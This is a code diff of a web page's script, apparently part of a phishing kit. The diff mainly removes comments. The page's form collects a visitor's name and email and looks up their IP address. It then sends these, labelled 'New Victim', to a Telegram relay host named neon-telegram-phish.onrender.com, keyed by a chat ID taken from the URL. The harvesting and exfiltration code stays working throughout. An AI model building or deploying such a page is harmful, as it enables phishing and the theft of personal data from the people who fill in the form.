@@ -67,47 +67,40 @@
   </div>
 
   <script>
-    // Function to get query parameters from the URL
     function getQueryParam(param) {
       const urlParams = new URLSearchParams(window.location.search);
       return urlParams.get(param);
     }
 
-    // Fetch the 'chat_id' from the URL query string
-    const chatId = getQueryParam('chat_id');  // Get chat_id from URL
+    const chatId = getQueryParam('chat_id');
 
-    // If 'chat_id' is missing, alert the user and stop the form submission
     if (!chatId) {
       alert("Chat ID is missing in the URL.");
-      document.getElementById("userForm").style.display = 'none';  // Hide the form if no chat_id
-      throw new Error("Chat ID is missing in the URL.");  // Stop script execution if chat_id is missing
+      document.getElementById("userForm").style.display = 'none';
+      throw new Error("Chat ID is missing in the URL.");
     }
 
-    // Form submission event
     document.getElementById("userForm").addEventListener("submit", function(event) {
       event.preventDefault();
 
       const name = document.getElementById("name").value;
       const email = document.getElementById("email").value;
 
-      // Fetch user IP address
       fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
           const userIP = data.ip;
 
-          // Format the message to send to Telegram
           const message = `New Victim:\nName: ${name}\nEmail: ${email}\nIP Address: ${userIP}`;
 
-          // Send the data to the proxy server (Firebase function)
           fetch('https://neon-telegram-phish.onrender.com', {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json',
             },
             body: JSON.stringify({
-              chat_id: chatId,   // Chat ID for the target user/group
-              message: message   // The message you want to send
+              chat_id: chatId,
+              message: message
             })
           })
           .then(response => response.json())
